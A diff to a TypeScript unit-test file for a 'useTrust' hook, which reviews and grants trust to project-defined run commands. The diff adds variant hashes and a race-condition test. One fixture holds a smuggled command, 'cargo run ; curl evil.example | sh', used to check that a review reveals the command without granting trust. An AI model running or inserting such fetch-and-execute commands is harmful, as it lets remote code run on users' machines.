@@ -25,8 +25,8 @@ const review: DomainEvent = {
   requires_trust: true,
   diff: { added: ["Api"], updated: [], removed: [], renamed: [] },
   commands: [
-    { name: "Api", command: "cargo run", working_dir: null, env: {} },
-    { name: "Web", command: "npm run dev", working_dir: null, env: {} },
+    { name: "Api", variant_hash: "api-v1", command: "cargo run", working_dir: null, env: {} },
+    { name: "Web", variant_hash: "web-v1", command: "npm run dev", working_dir: null, env: {} },
   ],
 };
 
@@ -41,7 +41,8 @@ function fire(event: DomainEvent) {
 
 describe("useTrust", () => {
   it("opens a review when a config change needs trust", () => {
-    const { result } = renderHook(() => useTrust(vi.fn(), vi.fn()));
+    const refresh = vi.fn();
+    const { result } = renderHook(() => useTrust(refresh, vi.fn()));
     fire(review);
     expect(result.current.review?.commands.map((c) => c.name)).toEqual(["Api", "Web"]);
   });
@@ -49,11 +50,13 @@ describe("useTrust", () => {
   it("requestReview opens what the command runs and grants nothing", async () => {
     readReview.mockResolvedValue({
       name: "Api",
+      variant_hash: "api-v2",
       command: "cargo run ; curl evil.example | sh",
       working_dir: null,
       env: {},
     });
-    const { result } = renderHook(() => useTrust(vi.fn(), vi.fn()));
+    const refresh = vi.fn();
+    const { result } = renderHook(() => useTrust(refresh, vi.fn()));
 
     act(() => result.current.requestReview(1, "Api"));
 
@@ -88,6 +91,7 @@ describe("useTrust", () => {
     await waitFor(() =>
       expect(result.current.review?.commands.map((c) => c.name)).toEqual(["Web"]),
     );
+    expect(grant).toHaveBeenCalledWith(1, "Api", "api-v1");
   });
 
   it("keeps the command and reports the error when the grant fails", async () => {
@@ -103,6 +107,37 @@ describe("useTrust", () => {
     expect(result.current.review?.commands.map((c) => c.name)).toEqual(["Api", "Web"]);
   });
 
+  it("does not dismiss a newer variant review when an older grant finishes", async () => {
+    let finishGrant: (() => void) | undefined;
+    grant.mockImplementation(
+      () =>
+        new Promise<void>((resolve) => {
+          finishGrant = resolve;
+        }),
+    );
+    const refresh = vi.fn();
+    const { result } = renderHook(() => useTrust(refresh, vi.fn()));
+    fire(review);
+    act(() => result.current.trust(1, "Api"));
+
+    fire({
+      ...review,
+      commands: [
+        {
+          name: "Api",
+          variant_hash: "api-v2",
+          command: "cargo run replacement",
+          working_dir: null,
+          env: {},
+        },
+      ],
+    });
+    act(() => finishGrant?.());
+
+    await waitFor(() => expect(refresh).toHaveBeenCalled());
+    expect(result.current.review?.commands[0]?.variant_hash).toBe("api-v2");
+  });
+
   it("closes the review with trustAll only after every grant resolves", async () => {
     grant.mockResolvedValue(undefined);
     const refresh = vi.fn();
@@ -113,6 +148,8 @@ describe("useTrust", () => {
 
     await waitFor(() => expect(result.current.review).toBeNull());
     expect(grant).toHaveBeenCalledTimes(2);
+    expect(grant).toHaveBeenCalledWith(1, "Api", "api-v1");
+    expect(grant).toHaveBeenCalledWith(1, "Web", "web-v1");
     expect(refresh).toHaveBeenCalledTimes(1);
   });
 });
